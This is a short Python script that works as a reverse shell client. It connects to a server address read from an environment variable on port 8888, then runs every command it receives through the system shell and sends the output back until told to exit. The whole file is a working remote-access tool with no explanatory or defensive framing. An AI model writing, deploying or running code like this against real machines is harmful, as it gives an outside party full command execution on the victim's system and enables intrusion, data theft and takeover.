import socket
import subprocess
import os
from dotenv import load_dotenv

SERVER_PORT = 8888

load_dotenv()
ip_server = os.getenv('IP_SERVER')

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ip_server, SERVER_PORT))

while True:
    command = client_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    client_socket.send(result.stdout.encode() + result.stderr.encode())

client_socket.close()
